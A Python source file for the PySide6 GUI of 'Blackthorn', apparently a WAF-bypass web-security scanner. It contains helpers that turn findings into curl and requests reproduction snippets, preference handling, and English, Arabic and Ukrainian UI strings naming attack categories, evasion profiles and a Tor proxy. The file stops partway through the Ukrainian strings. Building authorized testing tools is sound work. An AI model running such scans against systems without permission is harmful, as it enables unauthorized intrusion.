"""PySide6 GUI for Blackthorn (subprocess-backed)

This GUI runs the existing CLI module `wafpierce.pierce` in a subprocess so
we don't need to modify any scanner code. That lets the GUI provide a
responsive Start / Stop experience and save results to disk.

Run with:
    python3 -m wafpierce.gui
"""
from __future__ import annotations

import sys
import threading
import subprocess
import tempfile
import json
import os
import time
import concurrent.futures
from typing import Optional
import io

# Check if we're running as a frozen executable
IS_FROZEN = getattr(sys, 'frozen', False) or os.environ.get('WAFPIERCE_FROZEN') == '1'

# Public identity and brand assets. The lookup supports source, installed, and
# PyInstaller-frozen layouts while the internal package name remains stable.
from .branding import (
    BRAND_BANNER,
    DARK_LOGO,
    PRODUCT_NAME,
    TRANSPARENT_LOGO,
    asset_path,
)

LOGO_PATH = asset_path(TRANSPARENT_LOGO)
SIDEBAR_LOGO_PATH = asset_path(DARK_LOGO)
BANNER_PATH = asset_path(BRAND_BANNER)

# Use shared config module
from .config import get_gui_prefs_path
from . import __version__


# --------------------------------------------------------------------------- #
# Pure helpers (no Qt dependency) — kept at module scope so they're unit-testable
# without importing PySide6.
# --------------------------------------------------------------------------- #
def _finding_url(finding: dict) -> str:
    """Best-effort absolute URL for a finding."""
    url = finding.get('url') or finding.get('request_url')
    if url:
        return str(url)
    target = (finding.get('target') or '').rstrip('/')
    path = finding.get('path') or '/'
    return f"{target}{path}" if target else str(path)


def _finding_to_curl(finding: dict) -> str:
    """Reproduction curl for a finding — prefer the engine's recorded one."""
    curl = finding.get('curl')
    if curl:
        return str(curl)
    method = str(finding.get('method') or 'GET').upper()
    headers = finding.get('request_headers') or finding.get('headers') or {}
    parts = ['curl', '-i', '-s', '-k', '-X', method]
    if isinstance(headers, dict):
        for k, v in headers.items():
            parts.append('-H')
            parts.append(f"'{k}: {v}'")
    parts.append(f"'{_finding_url(finding)}'")
    return ' '.join(parts)


def _finding_to_python(finding: dict) -> str:
    """A copy-pasteable Python `requests` snippet reproducing the finding."""
    method = str(finding.get('method') or 'GET').upper()
    url = _finding_url(finding)
    headers = finding.get('request_headers') or finding.get('headers') or {}
    headers = headers if isinstance(headers, dict) else {}
    body = finding.get('request_body') or finding.get('data')
    lines = [
        "import requests",
        "",
        "resp = requests.request(",
        f"    {method!r}, {url!r},",
    ]
    if headers:
        lines.append(f"    headers={headers!r},")
    if body:
        lines.append(f"    data={body!r},")
    lines.append("    verify=False, allow_redirects=False, timeout=20,")
    lines.append(")")
    lines.append("print(resp.status_code, len(resp.content))")
    return '\n'.join(lines)


# Scan-profile keys that are safe to export/import (NOT the API key — secrets
# never leave the machine via a shared profile).
PROFILE_KEYS = [
    'threads', 'delay', 'concurrent', 'use_concurrent', 'retry_failed', 'advanced',
    'use_proxy', 'proxy_type_idx', 'proxy_host', 'proxy_port',
    'enable_http_logging', 'enable_ssl_analysis', 'ai_model',
]


def profile_from_prefs(prefs: dict) -> dict:
    """Extract the shareable scan-profile subset of prefs (no secrets)."""
    return {k: prefs[k] for k in PROFILE_KEYS if k in prefs}


def merge_profile(prefs: dict, data: dict) -> dict:
    """Merge an imported profile into prefs (only known, non-secret keys)."""
    for k in PROFILE_KEYS:
        if k in data:
            prefs[k] = data[k]
    return prefs


_LANGUAGE_ALIASES = {
    'english': 'en',
    'en-us': 'en',
    'en-gb': 'en',
    'arabic': 'ar',
    'arab': 'ar',
    'ar-sa': 'ar',
    'ukrainian': 'uk',
    'ukraine': 'uk',
    'ua': 'uk',
    'uk-ua': 'uk',
}
_LANGUAGE_CODES = {'en', 'ar', 'uk'}


def _normalize_language(value) -> str:
    code = str(value or 'en').strip().lower().replace('_', '-')
    code = _LANGUAGE_ALIASES.get(code, code)
    if '-' in code and code not in _LANGUAGE_CODES:
        code = code.split('-', 1)[0]
    return code if code in _LANGUAGE_CODES else 'en'


# default settings, change if you want different ones for the application
def _load_prefs() -> dict:
    path = get_gui_prefs_path()
    defaults = {
        'font_size': 12,
        'watermark': True,
        'threads': 5,
        'concurrent': 2,
        'use_concurrent': True,
        'delay': 0.2,
        'window_geometry': '980x640',
        'qt_geometry': '1000x640',
        'remember_targets': True,
        'retry_failed': 0,
        'ui_density': 'comfortable',
        'last_targets': [],
        'language': 'en',
    }
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    defaults.update(data)
    except Exception:
        pass
    defaults['language'] = _normalize_language(defaults.get('language', 'en'))
    return defaults


# ==================== TRANSLATIONS ====================
TRANSLATIONS = {
    'en': {
        'window_title': 'Blackthorn - Web Security Workspace',
        'target_url': 'Target URL:',
        'add': 'Add',
        'remove': 'Remove',
        'settings': 'Settings ⚙️',
        'threads': 'Threads:',
        'concurrent': 'Concurrent:',
        'use_concurrent': 'Use concurrent targets',
        'delay': 'Delay (s):',
        'queued': 'Queued',
        'running': 'Running',
        'done': 'Done',
        'error': 'Error',
        'target': 'Target',
        'status': 'Status',
        'progress': 'Progress',
        'total_progress': 'Total Progress:',
        'output': 'Output',
        'results': '📊 Results',
        'start': 'Start',
        'stop': 'Stop',
        'save': 'Save',
        'clear': 'Clear',
        'results_explorer': 'Results Explorer',
        'sites': '🌐 Sites',
        'all_sites': '📋 All Sites',
        'findings': 'findings',
        'total': 'Total',
        'bypasses': 'Bypasses',
        'sort_by': 'Sort by:',
        'filter': 'Filter:',
        'search': 'Search:',
        'search_placeholder': 'Search techniques, categories...',
        'severity_high_low': 'Severity (High to Low)',
        'severity_low_high': 'Severity (Low to High)',
        'technique_az': 'Technique (A-Z)',
        'technique_za': 'Technique (Z-A)',
        'category': 'Category',
        'bypass_status': 'Bypass Status',
        'all_results': 'All Results',
        'critical_only': '🔴 CRITICAL only',
        'high_only': '🟠 HIGH only',
        'medium_only': '🟡 MEDIUM only',
        'low_only': '🔵 LOW only',
        'info_only': 'ℹ️ INFO only',
        'bypasses_only': '✅ Bypasses only',
        'non_bypasses_only': '❌ Non-bypasses only',
        'expand_all': 'Expand All',
        'collapse_all': 'Collapse All',
        'technique': 'Technique',
        'severity': 'Severity',
        'reason': 'Reason',
        'details': 'Details',
        'export_view': 'Export View',
        'close': 'Close',
        'no_results': 'No Results',
        'no_results_msg': 'No scan results available yet.',
        'font_size': 'Font size (only in outputs):',
        'show_watermark': 'Show watermark/logo',
        'remember_targets': 'Remember last targets',
        'retry_failed': 'Retry failed targets:',
        'ui_density': 'UI density:',
        'language': 'Language:',
        'cancel': 'Cancel',
        'saved': 'Saved',
        'save_failed': 'Save failed',
        'exported': 'Exported',
        'export_failed': 'Export failed',
        'missing_target': 'Missing target',
        'add_target_msg': 'Please add at least one target',
        'run_finished': '[+] Run finished',
        'lang_restart_warning': '⚠️ Language will change after restart',
        'restart_confirm': 'Restart Required',
        'restart_confirm_msg': 'Language changed. Restart now to apply?',
        'yes': 'Yes',
        'no': 'No',
        'legal_disclaimer_title': 'Blackthorn - Legal Disclaimer',
        'legal_disclaimer_header': '⚠️ LEGAL DISCLAIMER ⚠️',
        'i_agree': 'I Agree',
        'i_decline': 'I Decline',
        'clean': 'Clean',
        'no_tmp_files': 'No temporary result files to remove',
        'remove_files_confirm': 'Remove {count} files?',
        'removed_files': 'Removed {count} file(s)',
        'no_results_for': 'No results for {target}',
        'results_for': 'Results — {target}',
        'done_exploits': 'Done (Exploits)',
        'errors_label': 'Errors',
        'errors_details': 'Errors details',
        'export_results_view': 'Export Results View',
        'no_results_to_export': 'No results to export with current filters.',
        'exported_results': 'Exported {count} results to {path}',
        'stop_requested': 'Stop requested',
        'compact': 'compact',
        'comfortable': 'comfortable',
        'spacious': 'spacious',
        'description': 'Description',
        'select_scan_types': 'Select Scan Types',
        'select_all': 'Select All',
        'deselect_all': 'Deselect All',
        'start_scan': 'Start Scan',
        'header_manipulation': 'Header Manipulation',
        'encoding_obfuscation': 'Encoding & Obfuscation',
        'protocol_level': 'Protocol-Level Attacks',
        'cache_control': 'Cache & Control',
        'injection_testing': 'Injection Testing',
        'security_misconfig': 'Security Misconfigurations',
        'business_logic': 'Business Logic & Authorization',
        'jwt_auth': 'JWT & Authentication Attacks',
        'graphql_attacks': 'GraphQL Attacks',
        'ai_attacks': 'AI / LLM Attacks',
        'ssrf_advanced': 'SSRF Advanced',
        'pdf_document': 'PDF/Document Attacks',
        'cloud_security': 'Cloud Security',
        'advanced_payloads': 'Advanced Payloads',
        'info_disclosure': 'Information Disclosure',
        'detection_recon': 'Detection & Reconnaissance',
        'os_detection': 'OS Detection',
        'os_detected_linux': 'Target OS detected: Linux/Unix',
        'os_detected_windows': 'Target OS detected: Windows',
        'os_detected_unknown': 'Target OS: Unknown (using universal exploits)',
        'os_filtering': 'Filtering exploits for detected OS',
        # New feature translations
        'save_as': 'Save As...',
        'save_json': 'Save as JSON',
        'save_html': 'Save as HTML',
        'html_report': 'HTML Report',
        'import_targets': 'Import Targets',
        'import_from_file': 'Import from File',
        'import_csv': 'CSV File',
        'import_json': 'JSON File',
        'import_burp': 'Burp Suite Export',
        'imported_targets': 'Imported {count} targets',
        'scheduled_scans': 'Scheduled Scans',
        'schedule_scan': 'Schedule Scan',
        'schedule_time': 'Schedule Time:',
        'schedule_daily': 'Daily',
        'schedule_weekly': 'Weekly',
        'schedule_monthly': 'Monthly',
        'schedule_once': 'Once',
        'scan_scheduled': 'Scan scheduled for {time}',
        'dashboard': '📈 Dashboard',
        'statistics': 'Statistics',
        'total_scans': 'Total Scans',
        'total_findings': 'Total Findings',
        'total_bypasses': 'Total Bypasses',
        'severity_distribution': 'Severity Distribution',
        'recent_activity': 'Recent Activity',
        'top_techniques': 'Top Techniques',
        'compare_scans': 'Compare Scans',
        'scan_history': 'Scan History',
        'new_findings': 'New Findings',
        'fixed_findings': 'Fixed Findings',
        'unchanged': 'Unchanged',
        'custom_payloads': 'Custom Payloads',
        'add_payload': 'Add Payload',
        'import_payloads': 'Import Payloads',
        'payload_name': 'Payload Name:',
        'payload_category': 'Category:',
        'payload_content': 'Payload:',
        'payload_added': 'Payload added successfully',
        'waf_detection': 'WAF Detection',
        'waf_detected': 'WAF Detected: {waf}',
        'no_waf_detected': 'No WAF Detected',
        'detecting_waf': 'Detecting WAF...',
        'evasion_profiles': 'Evasion Profiles',
        'select_profile': 'Select Evasion Profile:',
        'auto_select': 'Auto-select based on WAF',
        'rate_limit_detected': 'Rate limit detected! Adjusting delay...',
        'rate_limit_adjusted': 'Delay adjusted to {delay}s',
        'proxy_settings': 'Proxy Settings',
        'use_proxy': 'Use Proxy',
        'proxy_type': 'Proxy Type:',
        'proxy_host': 'Host:',
        'proxy_port': 'Port:',
        'proxy_auth': 'Authentication',
        'proxy_username': 'Username:',
        'proxy_password': 'Password:',
        'tor_proxy': 'Tor (SOCKS5)',
        'http_proxy': 'HTTP Proxy',
        'socks5_proxy': 'SOCKS5 Proxy',
        'custom_proxy': 'Custom Proxy',
        'test_proxy': 'Test Connection',
        'proxy_working': 'Proxy connection successful!',
        'proxy_failed': 'Proxy connection failed',
        'cve_reference': 'CVE Reference',
        'cwe_reference': 'CWE Reference',
        'cvss_score': 'CVSS Score',
        'view_cve': 'View CVE Details',
        'view_cwe': 'View CWE Details',
        'keyboard_shortcuts': 'Keyboard Shortcuts',
        'shortcut_start': 'Start Scan',
        'shortcut_stop': 'Stop Scan',
        'shortcut_save': 'Save Results',
        'shortcut_import': 'Import Targets',
        'shortcut_settings': 'Open Settings',
        'shortcut_dashboard': 'Open Dashboard',
        'shortcut_results': 'Open Results',
        'shortcut_clear': 'Clear All',
        'persist_results': 'Persist scan results',
        'restore_session': 'Restore previous session?',
        'session_restored': 'Session restored with {count} targets',
        'cve_cwe_references': 'CVE/CWE References',
        'reference_link': 'Reference Documentation',
        'related_cves': 'Related CVEs',
        # Privacy settings
        'privacy_settings': 'Privacy Settings',
        'censor_sites': 'Censor Site URLs',
        'censor_sites_tooltip': 'Hide sensitive domains for screenshots or screen sharing',
        # Forensics & SSL/TLS Analysis translations
        'forensics_settings': 'Forensics & Analysis',
        'enable_http_logging': 'Enable HTTP Request/Response Logging',
        'http_logging_tooltip': 'Capture full HTTP requests and responses for forensic analysis',
        'enable_ssl_analysis': 'Enable SSL/TLS Certificate Analysis',
        'ssl_analysis_tooltip': 'Analyze SSL certificates, cipher suites, and detect security issues',
        'view_http_log': 'View HTTP Log',
        'view_ssl_info': 'View SSL/TLS Info',
        'no_http_log': 'No HTTP log data available.',
        'http_log_title': 'HTTP Request/Response Log',
        'http_log_stats': '{count} HTTP transactions captured',
        'select_transaction': 'Select a transaction to view details...',
        'export_http_log': 'Export Log',
        'no_ssl_info': 'No SSL/TLS analysis data available.',
        'ssl_info_title': 'SSL/TLS Certificate Analysis',
        'connection_info': 'Connection Info',
        'certificate_info': 'Certificate Info',
        'security_issues': 'Security Issues',
        'no_security_issues': 'No security issues detected',
        'export_ssl_info': 'Export Info',
        'legal_disclaimer': """Blackthorn – Legal Disclaimer

FOR AUTHORIZED SECURITY TESTING ONLY

This tool is provided solely for legitimate security research and authorized penetration testing. You must obtain explicit, written permission from the system owner before testing any network, application, or device that you do not personally own.

Unauthorized access to computer systems, networks, or data is illegal and may result in criminal and/or civil penalties under applicable laws, including but not limited to the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and similar legislation in your jurisdiction.

By clicking "I Agree", you acknowledge and confirm that:

• You will only test systems that you own or have explicit written authorization to test
• You will comply with all applicable local, national, and international laws and regulations
• You accept full responsibility for your actions and use of this tool
• You understand that misuse of this tool may result in legal consequences

Limitation of Liability:
The developers, contributors, distributors, and owners of Blackthorn assume no liability for misuse, damage, legal consequences, data loss, service disruption, or any other harm resulting from the use or inability to use this tool. This software is provided "as is", without warranty of any kind, expressed or implied. You agree that you use this tool entirely at your own risk.""",
        # Timeline & Plugins translations
        'scan_timeline': 'Scan Timeline',
        'timeline_viewer': 'Timeline Viewer',
        'before_after': 'Before/After Comparison',
        'view_timeline': 'View Timeline',
        'timeline_event': 'Event',
        'timeline_date': 'Date',
        'timeline_target': 'Target',
        'timeline_findings': 'Findings',
        'compare_with_previous': 'Compare with Previous',
        'no_timeline_data': 'No timeline data available.',
        'plugins': 'Plugins',
        'plugin_manager': 'Plugin Manager',
        'installed_plugins': 'Installed Plugins',
        'marketplace': 'Marketplace',
        'install_plugin': 'Install',
        'uninstall_plugin': 'Uninstall',
        'enable_plugin': 'Enable',
        'disable_plugin': 'Disable',
        'plugin_name': 'Name',
        'plugin_version': 'Version',
        'plugin_author': 'Author',
        'plugin_description': 'Description',
        'plugin_category': 'Category',
        'plugin_status': 'Status',
        'plugin_enabled': 'Enabled',
        'plugin_disabled': 'Disabled',
        'open_plugins_folder': 'Open Plugins Folder',
        'refresh_plugins': 'Refresh',
        'create_plugin': 'Create New Plugin',
        'plugin_loaded': 'Plugin loaded: {name}',
        'plugin_uninstalled': 'Plugin uninstalled: {name}',
        'no_plugins': 'No plugins installed. Check the Marketplace or create your own!',
        'queue_restored': 'Scan queue restored with {count} targets',
        'queue_saved': 'Scan queue saved',
    },
    'ar': {
        'window_title': 'Blackthorn - واجهة المستخدم',
        'target_url': 'رابط الهدف:',
        'add': 'إضافة',
        'remove': 'إزالة',
        'settings': 'الإعدادات ⚙️',
        'threads': 'الخيوط:',
        'concurrent': 'متزامن:',
        'use_concurrent': 'استخدام أهداف متزامنة',
        'delay': 'التأخير (ث):',
        'queued': 'في الانتظار',
        'running': 'قيد التشغيل',
        'done': 'مكتمل',
        'error': 'خطأ',
        'target': 'الهدف',
        'status': 'الحالة',
        'progress': 'التقدم',
        'total_progress': 'التقدم الكلي:',
        'output': 'المخرجات',
        'results': '📊 النتائج',
        'start': 'بدء',
        'stop': 'إيقاف',
        'save': 'حفظ',
        'clear': 'مسح',
        'results_explorer': 'مستكشف النتائج',
        'sites': '🌐 المواقع',
        'all_sites': '📋 جميع المواقع',
        'findings': 'نتيجة',
        'total': 'المجموع',
        'bypasses': 'الاختراقات',
        'sort_by': 'ترتيب حسب:',
        'filter': 'تصفية:',
        'search': 'بحث:',
        'search_placeholder': 'بحث في التقنيات والفئات...',
        'severity_high_low': 'الخطورة (من الأعلى للأدنى)',
        'severity_low_high': 'الخطورة (من الأدنى للأعلى)',
        'technique_az': 'التقنية (أ-ي)',
        'technique_za': 'التقنية (ي-أ)',
        'category': 'الفئة',
        'bypass_status': 'حالة الاختراق',
        'all_results': 'جميع النتائج',
        'critical_only': '🔴 حرج فقط',
        'high_only': '🟠 عالي فقط',
        'medium_only': '🟡 متوسط فقط',
        'low_only': '🔵 منخفض فقط',
        'info_only': 'ℹ️ معلومات فقط',
        'bypasses_only': '✅ الاختراقات فقط',
        'non_bypasses_only': '❌ غير المخترقة فقط',
        'expand_all': 'توسيع الكل',
        'collapse_all': 'طي الكل',
        'technique': 'التقنية',
        'severity': 'الخطورة',
        'reason': 'السبب',
        'details': 'التفاصيل',
        'export_view': 'تصدير العرض',
        'close': 'إغلاق',
        'no_results': 'لا توجد نتائج',
        'no_results_msg': 'لا توجد نتائج فحص متاحة بعد.',
        'font_size': 'حجم الخط (في المخرجات فقط):',
        'show_watermark': 'إظهار العلامة المائية/الشعار',
        'remember_targets': 'تذكر الأهداف السابقة',
        'retry_failed': 'إعادة المحاولة للأهداف الفاشلة:',
        'ui_density': 'كثافة الواجهة:',
        'language': 'اللغة:',
        'cancel': 'إلغاء',
        'saved': 'تم الحفظ',
        'save_failed': 'فشل الحفظ',
        'exported': 'تم التصدير',
        'export_failed': 'فشل التصدير',
        'missing_target': 'هدف مفقود',
        'add_target_msg': 'الرجاء إضافة هدف واحد على الأقل',
        'run_finished': '[+] انتهى الفحص',
        'lang_restart_warning': '⚠️ سيتم تغيير اللغة بعد إعادة التشغيل',
        'restart_confirm': 'إعادة التشغيل مطلوبة',
        'restart_confirm_msg': 'تم تغيير اللغة. إعادة التشغيل الآن للتطبيق؟',
        'yes': 'نعم',
        'no': 'لا',
        'legal_disclaimer_title': 'Blackthorn - إخلاء المسؤولية القانونية',
        'legal_disclaimer_header': '⚠️ إخلاء المسؤولية القانونية ⚠️',
        'i_agree': 'أوافق',
        'i_decline': 'أرفض',
        'clean': 'تنظيف',
        'no_tmp_files': 'لا توجد ملفات نتائج مؤقتة للإزالة',
        'remove_files_confirm': 'إزالة {count} ملفات؟',
        'removed_files': 'تمت إزالة {count} ملف(ات)',
        'no_results_for': 'لا توجد نتائج لـ {target}',
        'results_for': 'النتائج — {target}',
        'done_exploits': 'مكتمل (الثغرات)',
        'errors_label': 'الأخطاء',
        'errors_details': 'تفاصيل الأخطاء',
        'export_results_view': 'تصدير عرض النتائج',
        'no_results_to_export': 'لا توجد نتائج للتصدير مع الفلاتر الحالية.',
        'exported_results': 'تم تصدير {count} نتيجة إلى {path}',
        'stop_requested': 'تم طلب الإيقاف',
        'compact': 'مضغوط',
        'comfortable': 'مريح',
        'spacious': 'واسع',
        'description': 'الوصف',
        'select_scan_types': 'اختر أنواع الفحص',
        'select_all': 'تحديد الكل',
        'deselect_all': 'إلغاء تحديد الكل',
        'start_scan': 'بدء الفحص',
        'header_manipulation': 'معالجة الترويسات',
        'encoding_obfuscation': 'الترميز والتشويش',
        'protocol_level': 'هجمات مستوى البروتوكول',
        'cache_control': 'التخزين المؤقت والتحكم',
        'injection_testing': 'اختبار الحقن',
        'security_misconfig': 'أخطاء التكوين الأمني',
        'business_logic': 'منطق الأعمال والترخيص',
        'jwt_auth': 'هجمات JWT والمصادقة',
        'graphql_attacks': 'هجمات GraphQL',
        'ssrf_advanced': 'SSRF متقدم',
        'pdf_document': 'هجمات PDF/المستندات',
        'cloud_security': 'أمان السحابة',
        'advanced_payloads': 'حمولات متقدمة',
        'info_disclosure': 'كشف المعلومات',
        'detection_recon': 'الكشف والاستطلاع',
        'os_detection': 'كشف نظام التشغيل',
        'os_detected_linux': 'نظام التشغيل المكتشف: لينكس/يونكس',
        'os_detected_windows': 'نظام التشغيل المكتشف: ويندوز',
        'os_detected_unknown': 'نظام التشغيل: غير معروف (استخدام الثغرات العالمية)',
        'os_filtering': 'تصفية الثغرات لنظام التشغيل المكتشف',
        # New feature translations
        'save_as': 'حفظ باسم...',
        'save_json': 'حفظ كـ JSON',
        'save_html': 'حفظ كـ HTML',
        'html_report': 'تقرير HTML',
        'import_targets': 'استيراد الأهداف',
        'import_from_file': 'استيراد من ملف',
        'import_csv': 'ملف CSV',
        'import_json': 'ملف JSON',
        'import_burp': 'تصدير Burp Suite',
        'imported_targets': 'تم استيراد {count} هدف',
        'scheduled_scans': 'الفحوصات المجدولة',
        'schedule_scan': 'جدولة فحص',
        'schedule_time': 'وقت الجدولة:',
        'schedule_daily': 'يومياً',
        'schedule_weekly': 'أسبوعياً',
        'schedule_monthly': 'شهرياً',
        'schedule_once': 'مرة واحدة',
        'scan_scheduled': 'تم جدولة الفحص لـ {time}',
        'dashboard': '📈 لوحة التحكم',
        'statistics': 'الإحصائيات',
        'total_scans': 'إجمالي الفحوصات',
        'total_findings': 'إجمالي النتائج',
        'total_bypasses': 'إجمالي التجاوزات',
        'severity_distribution': 'توزيع الخطورة',
        'recent_activity': 'النشاط الأخير',
        'top_techniques': 'أفضل التقنيات',
        'compare_scans': 'مقارنة الفحوصات',
        'scan_history': 'سجل الفحوصات',
        'new_findings': 'نتائج جديدة',
        'fixed_findings': 'نتائج تم إصلاحها',
        'unchanged': 'بدون تغيير',
        'custom_payloads': 'الحمولات المخصصة',
        'add_payload': 'إضافة حمولة',
        'import_payloads': 'استيراد الحمولات',
        'payload_name': 'اسم الحمولة:',
        'payload_category': 'الفئة:',
        'payload_content': 'الحمولة:',
        'payload_added': 'تمت إضافة الحمولة بنجاح',
        'waf_detection': 'كشف WAF',
        'waf_detected': 'تم اكتشاف WAF: {waf}',
        'no_waf_detected': 'لم يتم اكتشاف WAF',
        'detecting_waf': 'جاري كشف WAF...',
        'evasion_profiles': 'ملفات التهرب',
        'select_profile': 'اختر ملف التهرب:',
        'auto_select': 'اختيار تلقائي بناءً على WAF',
        'rate_limit_detected': 'تم اكتشاف حد المعدل! جاري ضبط التأخير...',
        'rate_limit_adjusted': 'تم ضبط التأخير إلى {delay} ثانية',
        'proxy_settings': 'إعدادات الوكيل',
        'use_proxy': 'استخدام الوكيل',
        'proxy_type': 'نوع الوكيل:',
        'proxy_host': 'المضيف:',
        'proxy_port': 'المنفذ:',
        'proxy_auth': 'المصادقة',
        'proxy_username': 'اسم المستخدم:',
        'proxy_password': 'كلمة المرور:',
        'tor_proxy': 'Tor (SOCKS5)',
        'http_proxy': 'وكيل HTTP',
        'socks5_proxy': 'وكيل SOCKS5',
        'custom_proxy': 'وكيل مخصص',
        'test_proxy': 'اختبار الاتصال',
        'proxy_working': 'اتصال الوكيل ناجح!',
        'proxy_failed': 'فشل اتصال الوكيل',
        'cve_reference': 'مرجع CVE',
        'cwe_reference': 'مرجع CWE',
        'cvss_score': 'درجة CVSS',
        'view_cve': 'عرض تفاصيل CVE',
        'view_cwe': 'عرض تفاصيل CWE',
        'keyboard_shortcuts': 'اختصارات لوحة المفاتيح',
        'shortcut_start': 'بدء الفحص',
        'shortcut_stop': 'إيقاف الفحص',
        'shortcut_save': 'حفظ النتائج',
        'shortcut_import': 'استيراد الأهداف',
        'shortcut_settings': 'فتح الإعدادات',
        'shortcut_dashboard': 'فتح لوحة التحكم',
        'shortcut_results': 'فتح النتائج',
        'shortcut_clear': 'مسح الكل',
        'persist_results': 'حفظ نتائج الفحص',
        'restore_session': 'استعادة الجلسة السابقة؟',
        'session_restored': 'تمت استعادة الجلسة مع {count} هدف',
        'cve_cwe_references': 'مراجع CVE/CWE',
        'reference_link': 'رابط المرجع',
        'related_cves': 'CVEs ذات صلة',
        # Forensics & SSL/TLS Analysis translations
        'forensics_settings': 'التحليل الجنائي والتحليل',
        'enable_http_logging': 'تمكين تسجيل طلبات/استجابات HTTP',
        'http_logging_tooltip': 'التقاط طلبات واستجابات HTTP الكاملة للتحليل الجنائي',
        'enable_ssl_analysis': 'تمكين تحليل شهادات SSL/TLS',
        'ssl_analysis_tooltip': 'تحليل شهادات SSL ومجموعات التشفير واكتشاف مشاكل الأمان',
        'view_http_log': 'عرض سجل HTTP',
        'view_ssl_info': 'عرض معلومات SSL/TLS',
        'no_http_log': 'لا تتوفر بيانات سجل HTTP.',
        'http_log_title': 'سجل طلبات واستجابات HTTP',
        'http_log_stats': 'تم التقاط {count} معاملة HTTP',
        'select_transaction': 'اختر معاملة لعرض التفاصيل...',
        'export_http_log': 'تصدير السجل',
        'no_ssl_info': 'لا تتوفر بيانات تحليل SSL/TLS.',
        'ssl_info_title': 'تحليل شهادة SSL/TLS',
        'connection_info': 'معلومات الاتصال',
        'certificate_info': 'معلومات الشهادة',
        'security_issues': 'مشاكل الأمان',
        'no_security_issues': 'لم يتم اكتشاف مشاكل أمنية',
        'export_ssl_info': 'تصدير المعلومات',
        'legal_disclaimer': """Blackthorn - إخلاء المسؤولية القانونية

لاختبار الأمان المصرح به فقط

تم توفير هذه الأداة فقط لأبحاث الأمان المشروعة واختبار الاختراق المصرح به. يجب عليك الحصول على إذن كتابي صريح من مالك النظام قبل اختبار أي شبكة أو تطبيق أو جهاز لا تملكه شخصياً.

الوصول غير المصرح به إلى أنظمة الكمبيوتر أو الشبكات أو البيانات غير قانوني وقد يؤدي إلى عقوبات جنائية و/أو مدنية بموجب القوانين المعمول بها.

بالنقر على "أوافق"، فإنك تقر وتؤكد أنك:

• ستختبر فقط الأنظمة التي تملكها أو لديك إذن كتابي صريح لاختبارها
• ستلتزم بجميع القوانين واللوائح المحلية والوطنية والدولية المعمول بها
• تتحمل المسؤولية الكاملة عن أفعالك واستخدامك لهذه الأداة
• تفهم أن سوء استخدام هذه الأداة قد يؤدي إلى عواقب قانونية

حدود المسؤولية:
لا يتحمل المطورون والمساهمون والموزعون وأصحاب Blackthorn أي مسؤولية عن سوء الاستخدام أو الضرر أو العواقب القانونية أو فقدان البيانات أو انقطاع الخدمة أو أي ضرر آخر ناتج عن استخدام هذه الأداة أو عدم القدرة على استخدامها. يتم توفير هذا البرنامج "كما هو" بدون أي ضمان من أي نوع. أنت توافق على أنك تستخدم هذه الأداة على مسؤوليتك الخاصة بالكامل.""",
        # Timeline & Plugins translations
        'scan_timeline': 'الجدول الزمني للفحص',
        'timeline_viewer': 'عارض الجدول الزمني',
        'before_after': 'مقارنة قبل/بعد',
        'view_timeline': 'عرض الجدول الزمني',
        'timeline_event': 'الحدث',
        'timeline_date': 'التاريخ',
        'timeline_target': 'الهدف',
        'timeline_findings': 'النتائج',
        'compare_with_previous': 'مقارنة مع السابق',
        'no_timeline_data': 'لا تتوفر بيانات الجدول الزمني.',
        'plugins': 'الإضافات',
        'plugin_manager': 'مدير الإضافات',
        'installed_plugins': 'الإضافات المثبتة',
        'marketplace': 'سوق الإضافات',
        'install_plugin': 'تثبيت',
        'uninstall_plugin': 'إلغاء التثبيت',
        'enable_plugin': 'تمكين',
        'disable_plugin': 'تعطيل',
        'plugin_name': 'الاسم',
        'plugin_version': 'الإصدار',
        'plugin_author': 'المؤلف',
        'plugin_description': 'الوصف',
        'plugin_category': 'الفئة',
        'plugin_status': 'الحالة',
        'plugin_enabled': 'مُمكَّن',
        'plugin_disabled': 'مُعطَّل',
        'open_plugins_folder': 'فتح مجلد الإضافات',
        'refresh_plugins': 'تحديث',
        'create_plugin': 'إنشاء إضافة جديدة',
        'plugin_loaded': 'تم تحميل الإضافة: {name}',
        'plugin_uninstalled': 'تم إلغاء تثبيت الإضافة: {name}',
        'no_plugins': 'لا توجد إضافات مثبتة. تحقق من السوق أو أنشئ إضافتك الخاصة!',
        'queue_restored': 'تمت استعادة قائمة الانتظار مع {count} هدف',
        'queue_saved': 'تم حفظ قائمة الانتظار',
    },
    'uk': {
        'window_title': 'Blackthorn - Інтерфейс',
        'target_url': 'URL цілі:',
        'add': 'Додати',
        'remove': 'Видалити',
        'settings': 'Налаштування ⚙️',
        'threads': 'Потоки:',
        'concurrent': 'Паралельно:',
        'use_concurrent': 'Використовувати паралельні цілі',
        'delay': 'Затримка (с):',
        'queued': 'В черзі',
        'running': 'Виконується',
        'done': 'Завершено',
        'error': 'Помилка',
        'target': 'Ціль',
        'status': 'Статус',
        'progress': 'Прогрес',
        'total_progress': 'Загальний прогрес:',
        'output': 'Вивід',
        'Done': 'Завершено',
        'Queued': 'В черзі',
        'results': '📊 Результати',
        'start': 'Старт',
        'stop': 'Стоп',
        'save': 'Зберегти',
        'clear': 'Очистити',
        'results_explorer': 'Провідник результатів',
        'sites': '🌐 Сайти',
        'findings': 'знахідки',
        'languages': 'мови',
        'servers': 'сервери',
        'all_sites': '📋 Всі сайти',
        'findings': 'знахідок',
        'total': 'Всього',
        'bypasses': 'Обходи',
        'sort_by': 'Сортувати:',
        'filter': 'Фільтр:',
        'search': 'Пошук:',
        'search_placeholder': 'Пошук технік, категорій...',
        'severity_high_low': 'Серйозність (Висока→Низька)',
        'severity_low_high': 'Серйозність (Низька→Висока)',
        'technique_az': 'Техніка (А-Я)',
        'technique_za': 'Техніка (Я-А)',
        'category': 'Категорія',
        'bypass_status': 'Статус обходу',
        'all_results': 'Всі результати',
        'critical_only': '🔴 Тільки КРИТИЧНІ',
        'high_only': '🟠 Тільки ВИСОКІ',
        'medium_only': '🟡 Тільки СЕРЕДНІ',
        'low_only': '🔵 Тільки НИЗЬКІ',
        'info_only': 'ℹ️ Тільки ІНФО',
        'bypasses_only': '✅ Тільки обходи',
        'non_bypasses_only': '❌ Тільки без обходу',
        'expand_all': 'Розгорнути все',
        'collapse_all': 'Згорнути все',
        'technique': 'Техніка',
        'severity': 'Серйозність',
        'reason': 'Причина',
        'details': 'Деталі',
        'export_view': 'Експорт',
        'close': 'Закрити',
        'no_results': 'Немає результатів',
